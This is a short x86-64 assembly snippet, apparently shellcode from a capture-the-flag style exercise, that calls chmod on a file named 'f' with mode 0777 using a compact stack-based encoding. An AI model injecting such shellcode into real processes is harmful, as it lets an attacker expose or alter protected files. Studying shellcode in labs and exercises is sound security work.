.intel_syntax noprefix
.global _start
_start:

push 'f'
push rsp
pop rdi
mov al, 90
mov si, 0777
syscall